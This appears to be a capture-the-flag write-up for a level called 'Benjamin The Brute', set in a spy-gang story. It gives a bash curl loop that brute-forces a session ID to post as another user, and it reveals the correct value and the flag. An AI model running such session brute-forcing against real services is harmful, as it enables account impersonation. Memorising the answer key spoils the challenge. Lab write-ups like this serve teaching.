# Benjamin The Brute - L11 C06

Agent 707, one of the gang, Benjamin Goldleaf, was yesterday overheard by our inside undercover agent talking about posting notices on a secret message board that the gang use to communicate meeting times.

With a bit of detective work we've managed to find the message board and get Bens user details. We want to post a fake message using the API to try and draw one of the more senior gang members out, but we can't get it to work. See if you can.

**Tip:** Successfully post a notice on the board to get the flag.

```
💡 Hint: There seems to be a required parameter - "sessID" - requiring a number. There aren't too many users,
   maybe try brute forcing this value. You could do that in Python or you could write a BASH script using CURL.
```

## Step by Step

- Open a Linux terminal
- Run `for i in {1..100}; do curl -X POST -d "userID=24&sessID=$i" https://bondogge.com/createPost; echo ""; done`
`
- This will eventually reach to correct sessID of `78` and spit out the flag

`flag: br1ti5h.bulld0gZ`
